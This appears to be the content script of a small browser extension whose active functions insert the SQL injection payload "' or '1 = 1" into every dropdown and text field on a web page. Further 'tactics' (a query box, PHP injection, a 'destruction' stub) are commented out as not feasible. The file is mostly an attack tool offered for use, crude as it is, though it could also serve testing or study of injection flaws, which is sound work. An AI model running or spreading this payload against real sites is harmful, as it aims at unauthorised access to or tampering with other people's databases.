'use strict';

// ----- Tactic 1 -----
function dropdownInject(){
  var dropdowns = document.getElementsByTagName('select');

  //If there are no dropdowns to inject, stop
  if (dropdowns.length == 0){
    //alert("There are no dropdowns to inject into.");
    return 1;
  }

  //Set injection tactic
  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
  for (var i = 0, l = dropdowns.length; i < l; i++) {
    dropdowns[i].innerHTML = injectionString + dropdowns[i].innerHTML;
  }
  //alert("Injected");
}

// ----- Tactic 2 -----
function tfInject(){
  var tfs = document.getElementsByTagName('input');
  var injectionString = "\' or \'1 = 1"
  for (var i = 0; i < tfs.length; i++){
    tfs[i].value = injectionString;
  }
}
/*
// ----- Tactic 3 -----
function idTable(){
  // Not very feasable
  var listeners = getEventListeners();
}

// ----- Tactic 4 -----
function customScriptBox(){
  // Adds to the website but not really useful as PHP only runs server side
  var originalHTML = document.getElementsByTagName('body');
  var scriptbox = 'Insert Query Here: <input id=\"customquery\"></input> <button id=\"csb\">Submit</button>';
  originalHTML[0].innerHTML = scriptbox + originalHTML[0].innerHTML; 
  document.getElementById('csb').addEventListener('click', runcs);
}

function runcs(){
  // Adds to the website but not really useful as PHP only runs server side
  var query = document.getElementById('customquery');
  var phpblock1 = "<?php";
  var phpblock2 = "echo(did the php work);";
  var phpblock3 = "?>";
  var originalHTML = document.getElementsByTagName('body');
  originalHTML[0].innerHTML = phpblock1 + phpblock2 + phpblock3 + originalHTML[0].innerHTML;
}

// ----- Tactic 5 -----
function destruction(){
  // Not very feasable, at least not as intended
}
*/
module.exports.dropdownInject = dropdownInject
module.exports.tfInject = tfInject




/*
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.message === "inject_to_dropdowns"){
      dropdownInject();
      chrome.runtime.sendMessage({"message": "Injection Completed"})
    }
    else if (request.message === "textfield_to_inject"){
      tfInject();
    }
    else if (request.message === "identify_table"){
      idTable();
    }
    else if (request.message === "custom_script_box"){
      customScriptBox();
    }
    else if (request.message === "destruction"){
      alert("Crush Kill Destory");
    }
  }
);

*/